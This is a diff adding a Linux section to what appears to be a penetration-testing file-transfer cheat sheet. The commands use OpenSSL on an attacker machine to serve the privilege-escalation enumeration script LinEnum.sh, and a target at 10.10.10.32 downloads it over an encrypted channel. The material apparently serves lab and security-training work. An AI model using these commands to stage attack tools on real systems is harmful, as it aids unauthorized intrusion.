@@ -448,3 +448,25 @@ Then access the redirected drive in the RDP session through:
 ```text
 \\tsclient\
 ```
+
+### Linux
+
+#### OpenSSL — Target → Attacker
+
+```bash
+# Attacker
+openssl req -newkey rsa:2048 -nodes \
+    -keyout key.pem \
+    -x509 -days 365 \
+    -out certificate.pem
+
+openssl s_server -quiet \
+    -accept 80 \
+    -cert certificate.pem \
+    -key key.pem < /tmp/LinEnum.sh
+```
+
+```bash
+# Target
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
